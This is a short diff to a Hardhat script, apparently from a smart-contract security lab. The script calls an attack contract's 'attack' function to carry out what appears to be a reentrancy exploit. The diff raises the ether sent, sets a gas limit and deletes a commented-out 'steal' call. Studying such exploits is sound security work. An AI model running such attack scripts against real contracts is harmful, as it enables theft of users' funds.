@@ -30,13 +30,12 @@ async function main() {
   console.log("Executing the attack...");
   await (
     await attackContract.attack({
-      value: hardhat.ethers.parseEther("1.0"),
+      value: hardhat.ethers.parseEther("2.0"),
       gasLimit: "0x" + (2000000).toString(16),
     })
   ).wait();
 
   // Without Gas Limit it won't work because it will run out of gas in the middle of the recursion
-  // await (await attackContract.steal({value: hardhat.ethers.utils.parseEther("1.0")})).wait();
 
   // Print Summary
   console.log("Attack Done.");
